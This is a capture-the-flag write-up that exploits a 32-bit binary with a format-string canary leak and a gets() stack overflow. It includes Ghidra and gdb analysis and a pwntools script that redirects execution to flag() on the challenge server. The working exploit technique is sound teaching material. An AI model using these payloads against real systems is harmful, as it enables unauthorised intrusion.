
# Finches in a Stack

## Description

```
Challenge instance ready at 88.198.219.20:56502.

There's a service at ..., exploit it to get the flag.
```

Category: Pwn

## Analysis

What are we dealing with?

```bash
kali@kali:~/Downloads/ractf/finches_in_a_stack$ ls
fias
kali@kali:~/Downloads/ractf/finches_in_a_stack$ file fias 
fias: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=e8e9871f93c103af02b7d5f25c86962ec1c322b9, for GNU/Linux 3.2.0, not stripped
kali@kali:~/Downloads/ractf/finches_in_a_stack$ ./fias 
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? hello
Nice to meet you, hello!
Do YOU want to pet my canary?
maybe
kali@kali:~/Downloads/ractf/finches_in_a_stack$ 
```

Decompile with Ghidra. The interesting part is in `say_hi()`:

```c
void say_hi(void)

{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  int in_GS_OFFSET;
  byte bVar4;
  char local_29 [4];
  undefined2 uStack37;
  undefined local_22 [18];
  int local_10;
  
  bVar4 = 0;
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Hi! What\'s your name? ");
  gets((char *)((int)&uStack37 + 1));
  printf("Nice to meet you, ");
  uVar2 = 0xffffffff;
  pcVar3 = (char *)((int)&uStack37 + 1);
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
  } while (cVar1 != '\0');
  *(undefined2 *)((int)&uStack37 + ~uVar2) = 0xa21;
  *(undefined *)((int)&uStack37 + ~uVar2 + 2) = 0;
  printf((char *)((int)&uStack37 + 1));
  puts("Do YOU want to pet my canary?");
  gets(local_29);
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

This is a buffer overflow attack, but there's a pesky canary in the way that we'll have to bypass.

```bash
kali@kali:~/Downloads/ractf/finches_in_a_stack$ checksec fias
[*] '/home/kali/Downloads/ractf/finches_in_a_stack/fias'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Background reading:

* <https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries>

* <https://ctf101.org/binary-exploitation/stack-canaries/>

* <https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx>

* <https://github.com/datajerk/ctf-write-ups/blob/master/b01lersctf2020/blind-piloting/README.md>

We should be able to get the value of the canary from the first question, and then overwrite both the canary and the return address from the second question. We need to get to `flag()`:

```c
void flag(void)

{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  system((char *)(iVar1 + 0xe2a));
  return;
}
```

Let's see the canary in action:

```
(gdb) run fias
Starting program: /home/kali/Downloads/ractf/finches_in_a_stack/fias fias
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'!
Do YOU want to pet my canary?
nope
*** stack smashing detected ***: <unknown> terminated

Program received signal SIGABRT, Aborted.
0xf7fd3b59 in __kernel_vsyscall ()
```

What can we print out with a a nice long format string?

```bash
kali@kali:~/Downloads/ractf/finches_in_a_stack$ echo '%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p' | ./fias 
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? Nice to meet you, 0xf7fa52c0 0x3e8 0x8049246 0xf7f71000 0xf7f71000 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x21702520 0xf7fb000a (nil) 0xf7f71000 0xf7f71000 (nil)!
Do YOU want to pet my canary?
*** stack smashing detected ***: <unknown> terminated
Aborted
```

How do we find the canary though? This is the check from the decompiled code:

```c
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
```

Look at the disassembly and set a breakpoint there:

```
(gdb) disas say_hi
Dump of assembler code for function say_hi:
   0x08049239 <+0>:     push   %ebp
   0x0804923a <+1>:     mov    %esp,%ebp
   0x0804923c <+3>:     push   %edi
   0x0804923d <+4>:     push   %ebx
   0x0804923e <+5>:     sub    $0x20,%esp
   0x08049241 <+8>:     call   0x8049110 <__x86.get_pc_thunk.bx>
   0x08049246 <+13>:    add    $0x2dba,%ebx
   0x0804924c <+19>:    mov    %gs:0x14,%eax
   0x08049252 <+25>:    mov    %eax,-0xc(%ebp)
   0x08049255 <+28>:    xor    %eax,%eax
   0x08049257 <+30>:    sub    $0xc,%esp
   0x0804925a <+33>:    lea    -0x1f94(%ebx),%eax
   0x08049260 <+39>:    push   %eax
   0x08049261 <+40>:    call   0x8049030 <printf@plt>
   0x08049266 <+45>:    add    $0x10,%esp
   0x08049269 <+48>:    sub    $0xc,%esp
   0x0804926c <+51>:    lea    -0x20(%ebp),%eax
   0x0804926f <+54>:    push   %eax
   0x08049270 <+55>:    call   0x8049040 <gets@plt>
   0x08049275 <+60>:    add    $0x10,%esp
   0x08049278 <+63>:    sub    $0xc,%esp
   0x0804927b <+66>:    lea    -0x1f7d(%ebx),%eax
   0x08049281 <+72>:    push   %eax
   0x08049282 <+73>:    call   0x8049030 <printf@plt>
   0x08049287 <+78>:    add    $0x10,%esp
   0x0804928a <+81>:    lea    -0x20(%ebp),%eax
   0x0804928d <+84>:    mov    $0xffffffff,%ecx
   0x08049292 <+89>:    mov    %eax,%edx
   0x08049294 <+91>:    mov    $0x0,%eax
   0x08049299 <+96>:    mov    %edx,%edi
   0x0804929b <+98>:    repnz scas %es:(%edi),%al
   0x0804929d <+100>:   mov    %ecx,%eax
   0x0804929f <+102>:   not    %eax
   0x080492a1 <+104>:   lea    -0x1(%eax),%edx
   0x080492a4 <+107>:   lea    -0x20(%ebp),%eax
   0x080492a7 <+110>:   add    %edx,%eax
   0x080492a9 <+112>:   movw   $0xa21,(%eax)
   0x080492ae <+117>:   movb   $0x0,0x2(%eax)
   0x080492b2 <+121>:   lea    -0x20(%ebp),%eax
   0x080492b5 <+124>:   sub    $0xc,%esp
   0x080492b8 <+127>:   push   %eax
   0x080492b9 <+128>:   call   0x8049030 <printf@plt>
   0x080492be <+133>:   add    $0x10,%esp
   0x080492c1 <+136>:   sub    $0xc,%esp
   0x080492c4 <+139>:   lea    -0x1f6a(%ebx),%eax
   0x080492ca <+145>:   push   %eax
   0x080492cb <+146>:   call   0x8049070 <puts@plt>
   0x080492d0 <+151>:   add    $0x10,%esp
   0x080492d3 <+154>:   sub    $0xc,%esp
   0x080492d6 <+157>:   lea    -0x25(%ebp),%eax
   0x080492d9 <+160>:   push   %eax
   0x080492da <+161>:   call   0x8049040 <gets@plt>
   0x080492df <+166>:   add    $0x10,%esp
   0x080492e2 <+169>:   nop
   0x080492e3 <+170>:   mov    -0xc(%ebp),%eax
   0x080492e6 <+173>:   xor    %gs:0x14,%eax
   0x080492ed <+180>:   je     0x80492f4 <say_hi+187>
   0x080492ef <+182>:   call   0x80493f0 <__stack_chk_fail_local>
   0x080492f4 <+187>:   lea    -0x8(%ebp),%esp
   0x080492f7 <+190>:   pop    %ebx
   0x080492f8 <+191>:   pop    %edi
   0x080492f9 <+192>:   pop    %ebp
   0x080492fa <+193>:   ret
End of assembler dump.
(gdb) break *0x080492e6
Breakpoint 1 at 0x80492e6
```

Trigger the breakpoint.

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/ractf/finches_in_a_stack/fias fias
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? foo
Nice to meet you, foo!
Do YOU want to pet my canary?
nah

Breakpoint 1, 0x080492e6 in say_hi ()
```

We stopped here:

```
   0x080492e3 <+170>:   mov    -0xc(%ebp),%eax
   0x080492e6 <+173>:   xor    %gs:0x14,%eax
```

So what's in the stack and registers? `esp` is the stack pointer, and `ebp` is the base pointer. `gs` is a segment register used for thread-specific memory in Linux.

```
(gdb) info reg
eax            0x654d0c00          1699548160
ecx            0xf7fb5580          -134523520
edx            0xffffccc6          -13114
ebx            0x804c000           134529024
esp            0xffffccc0          0xffffccc0
ebp            0xffffcce8          0xffffcce8
esi            0xf7fb5000          -134524928
edi            0xffffcccc          -13108
eip            0x80492e6           0x80492e6 <say_hi+173>
eflags         0x286               [ PF SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/40wx $ebp
0xffffcce8:     0xffffcd08      0x0804936c      0x00000002      0xffffcdb4
0xffffccf8:     0xffffcdc0      0x000003e8      0xffffcd20      0x00000000
0xffffcd08:     0x00000000      0xf7df3ef1      0xf7fb5000      0xf7fb5000
0xffffcd18:     0x00000000      0xf7df3ef1      0x00000002      0xffffcdb4
0xffffcd28:     0xffffcdc0      0xffffcd44      0x00000001      0x00000000
0xffffcd38:     0xf7fb5000      0x00000000      0xf7ffd000      0x00000000
0xffffcd48:     0xf7fb5000      0xf7fb5000      0x00000000      0x0ad9d421
0xffffcd58:     0x4b3ef231      0x00000000      0x00000000      0x00000000
0xffffcd68:     0x00000002      0x080490c0      0x00000000      0xf7fe92c0
0xffffcd78:     0xf7fe4140      0x0804c000      0x00000002      0x080490c0
(gdb) x/40wx $esp
0xffffccc0:     0x6efb5000      0xf7006861      0x216f6f66      0x0804000a
0xffffccd0:     0x0804a048      0xf7ffd940      0x0804c000      0x654d0c00
0xffffcce0:     0x0804c000      0xf7fb5000      0xffffcd08      0x0804936c
0xffffccf0:     0x00000002      0xffffcdb4      0xffffcdc0      0x000003e8
0xffffcd00:     0xffffcd20      0x00000000      0x00000000      0xf7df3ef1
0xffffcd10:     0xf7fb5000      0xf7fb5000      0x00000000      0xf7df3ef1
0xffffcd20:     0x00000002      0xffffcdb4      0xffffcdc0      0xffffcd44
0xffffcd30:     0x00000001      0x00000000      0xf7fb5000      0x00000000
0xffffcd40:     0xf7ffd000      0x00000000      0xf7fb5000      0xf7fb5000
0xffffcd50:     0x00000000      0x0ad9d421      0x4b3ef231      0x00000000
```

Is `0x654d0c00` the canary? The MSB should be 00 on Linux.

`0x0804936c` is the return address that takes us back to `main()` after the `say_hi()` call is done.

```
(gdb) x 0x0804936c
0x804936c <main+113>:   0x000000b8
```

```
   0x08049367 <+108>:   call   0x8049239 <say_hi>
   0x0804936c <+113>:   mov    $0x0,%eax
```

Let's fill up the input buffers to see where it ends up on the stack.

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/ractf/finches_in_a_stack/fias fias
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? AAAA
Nice to meet you, AAAA!
Do YOU want to pet my canary?
BBBBBBBBBBBBBBBBBB

Breakpoint 1, 0x080492e6 in say_hi ()
(gdb) x/40wx $esp
0xffffccc0:     0x42fb5000      0x42424242      0x42424242      0x42424242
0xffffccd0:     0x42424242      0xf7ff0042      0x0804c000      0xf6990b00
0xffffcce0:     0x0804c000      0xf7fb5000      0xffffcd08      0x0804936c
0xffffccf0:     0x00000002      0xffffcdb4      0xffffcdc0      0x000003e8
0xffffcd00:     0xffffcd20      0x00000000      0x00000000      0xf7df3ef1
0xffffcd10:     0xf7fb5000      0xf7fb5000      0x00000000      0xf7df3ef1
0xffffcd20:     0x00000002      0xffffcdb4      0xffffcdc0      0xffffcd44
0xffffcd30:     0x00000001      0x00000000      0xf7fb5000      0x00000000
0xffffcd40:     0xf7ffd000      0x00000000      0xf7fb5000      0xf7fb5000
0xffffcd50:     0x00000000      0x1692e8b6      0x5775cea6      0x00000000
(gdb) cont
Continuing.
[Inferior 1 (process 14006) exited normally]
```

That exited successfully. Add 8 more chars to hit what I think is the canary.

```
(gdb) run
Starting program: /home/kali/Downloads/ractf/finches_in_a_stack/fias fias
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? AAAA
Nice to meet you, AAAA!
Do YOU want to pet my canary?
BBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 1, 0x080492e6 in say_hi ()
(gdb) x/40wx $esp
0xffffccc0:     0x42fb5000      0x42424242      0x42424242      0x42424242
0xffffccd0:     0x42424242      0x42424242      0x42424242      0xe9080042
0xffffcce0:     0x0804c000      0xf7fb5000      0xffffcd08      0x0804936c
0xffffccf0:     0x00000002      0xffffcdb4      0xffffcdc0      0x000003e8
0xffffcd00:     0xffffcd20      0x00000000      0x00000000      0xf7df3ef1
0xffffcd10:     0xf7fb5000      0xf7fb5000      0x00000000      0xf7df3ef1
0xffffcd20:     0x00000002      0xffffcdb4      0xffffcdc0      0xffffcd44
0xffffcd30:     0x00000001      0x00000000      0xf7fb5000      0x00000000
0xffffcd40:     0xf7ffd000      0x00000000      0xf7fb5000      0xf7fb5000
0xffffcd50:     0x00000000      0x83d979a9      0xc23e5fb9      0x00000000
(gdb) cont
Continuing.
*** stack smashing detected ***: <unknown> terminated

Program received signal SIGABRT, Aborted.
0xf7fd3b59 in __kernel_vsyscall ()
```

There we go. We just overwrote the MSB in `0xe9080042`, which triggered the canary check.

26 chars hits the canary:

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/ractf/finches_in_a_stack/fias fias
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? AAA
Nice to meet you, AAA!
Do YOU want to pet my canary?

Breakpoint 2, 0x080492da in say_hi ()
(gdb) cont
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080492e6 in say_hi ()
(gdb) x/40wx $esp
0xffffccc0:     0x41fb5000      0x41414141      0x41414141      0x41414141
0xffffccd0:     0x41414141      0x41414141      0x41414141      0x86630041
0xffffcce0:     0x0804c000      0xf7fb5000      0xffffcd08      0x0804936c
0xffffccf0:     0x00000002      0xffffcdb4      0xffffcdc0      0x000003e8
0xffffcd00:     0xffffcd20      0x00000000      0x00000000      0xf7df3ef1
0xffffcd10:     0xf7fb5000      0xf7fb5000      0x00000000      0xf7df3ef1
0xffffcd20:     0x00000002      0xffffcdb4      0xffffcdc0      0xffffcd44
0xffffcd30:     0x00000001      0x00000000      0xf7fb5000      0x00000000
0xffffcd40:     0xf7ffd000      0x00000000      0xf7fb5000      0xf7fb5000
0xffffcd50:     0x00000000      0x3ee0281e      0x7f070e0e      0x00000000
(gdb) cont
Continuing.
*** stack smashing detected ***: <unknown> terminated

Program received signal SIGABRT, Aborted.
0xf7fd3b59 in __kernel_vsyscall ()
```

but 25 chars does not:

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Downloads/ractf/finches_in_a_stack/fias fias
No! You bad canary! Get back in your cage!

I don't want you attacking anyone!

Hi! What's your name? AAAA
Nice to meet you, AAAA!
Do YOU want to pet my canary?

Breakpoint 2, 0x080492da in say_hi ()
(gdb) AAAAAAAAAAAAAAAAAAAAAAAAA
Undefined command: "AAAAAAAAAAAAAAAAAAAAAAAAA".  Try "help".
(gdb) cont
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAA 

Breakpoint 1, 0x080492e6 in say_hi ()
(gdb) x/40wx $esp
0xffffccc0:     0x41fb5000      0x41414141      0x41414141      0x41414141
0xffffccd0:     0x41414141      0x41414141      0x41414141      0xcd03ba00
0xffffcce0:     0x0804c000      0xf7fb5000      0xffffcd08      0x0804936c
0xffffccf0:     0x00000002      0xffffcdb4      0xffffcdc0      0x000003e8
0xffffcd00:     0xffffcd20      0x00000000      0x00000000      0xf7df3ef1
0xffffcd10:     0xf7fb5000      0xf7fb5000      0x00000000      0xf7df3ef1
0xffffcd20:     0x00000002      0xffffcdb4      0xffffcdc0      0xffffcd44
0xffffcd30:     0x00000001      0x00000000      0xf7fb5000      0x00000000
0xffffcd40:     0xf7ffd000      0x00000000      0xf7fb5000      0xf7fb5000
0xffffcd50:     0x00000000      0x488103f8      0x096625e8      0x00000000
(gdb) cond
Argument required (breakpoint number).
(gdb) cont
Continuing.
[Inferior 1 (process 14942) exited normally]
```

Now how do we get the canary with a format string?

* <https://stackoverflow.com/questions/7459630/how-can-a-format-string-vulnerability-be-exploited>

```
you can use notations such as:

"%200$p"

to read the 200th item on the stack
```

Took a little experimentation, but here it is:

```bash
kali@kali:~/Downloads/ractf/finches_in_a_stack$ perl -e 'print "%11\$p\n"' | ./fias | grep Nice
Hi! What's your name? Nice to meet you, 0x5b5b5300!
kali@kali:~/Downloads/ractf/finches_in_a_stack$ perl -e 'print "%11\$p\n"' | ./fias | grep Nice
Hi! What's your name? Nice to meet you, 0x3d0f2c00!
kali@kali:~/Downloads/ractf/finches_in_a_stack$ perl -e 'print "%11\$p\n"' | ./fias | grep Nice
Hi! What's your name? Nice to meet you, 0x27184400!
kali@kali:~/Downloads/ractf/finches_in_a_stack$ perl -e 'print "%11\$p\n"' | ./fias | grep Nice
Hi! What's your name? Nice to meet you, 0x5f790600!
```

## Solution

Now we know enough about the input we need to generate to overwrite both the canary and the return address. We can use `%11$p` to get the canary from the stack on the first question, then on the second question we can overflow the buffer and overwrite both the canary and the return address to invoke `flag()` to print the flag from the remote server.

```python
#!/usr/bin/env python3
from pwn import *

context.log_level='DEBUG'
binary = ELF('./fias')
print("flag(): %x\n" % binary.symbols['flag'])

#p = process('./fias')
p = remote('88.198.219.20', 56502)
p.recvuntil("Hi! What's your name?")
p.sendline('%11$p')
line = p.recvline()
addrs = line.decode().split(', ')[1][:-2].split('-')
canary = int(addrs[0], 16)
print("canary: %x\n" % canary)

p.recvuntil("Do YOU want to pet my canary?")
payload = b'B' * (25)
payload += p32(canary)
payload += p32(binary.symbols['flag']) * 4
p.sendline(payload)
p.stream()
```

```bash
kali@kali:~/Downloads/ractf/finches_in_a_stack$ ./exploit.py 
[DEBUG] PLT 0x8049030 printf
[DEBUG] PLT 0x8049040 gets
[DEBUG] PLT 0x8049050 __stack_chk_fail
[DEBUG] PLT 0x8049060 getegid
[DEBUG] PLT 0x8049070 puts
[DEBUG] PLT 0x8049080 system
[DEBUG] PLT 0x8049090 __libc_start_main
[DEBUG] PLT 0x80490a0 setvbuf
[DEBUG] PLT 0x80490b0 setresgid
[*] '/home/kali/Downloads/ractf/finches_in_a_stack/fias'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
flag(): 80491d2

[+] Opening connection to 88.198.219.20 on port 56502: Done
[DEBUG] Received 0x50 bytes:
    b'No! You bad canary! Get back in your cage!\n'
    b'\n'
    b"I don't want you attacking anyone!\n"
    b'\n'
[DEBUG] Received 0x16 bytes:
    b"Hi! What's your name? "
[DEBUG] Sent 0x6 bytes:
    b'%11$p\n'
[DEBUG] Received 0x12 bytes:
    b'Nice to meet you, '
[DEBUG] Received 0x2a bytes:
    b'0x70f3dc00!\n'
    b'Do YOU want to pet my canary?\n'
canary: 70f3dc00

[DEBUG] Sent 0x2e bytes:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    00000010  42 42 42 42  42 42 42 42  42 00 dc f3  70 d2 91 04  │BBBB│BBBB│B···│p···│
    00000020  08 d2 91 04  08 d2 91 04  08 d2 91 04  08 0a        │····│····│····│··│
    0000002e

[DEBUG] Received 0x19 bytes:
    b'ractf{St4ck_C4n4ry_FuN!}\n'
ractf{St4ck_C4n4ry_FuN!}
```

The flag is:

```
ractf{St4ck_C4n4ry_FuN!}
```

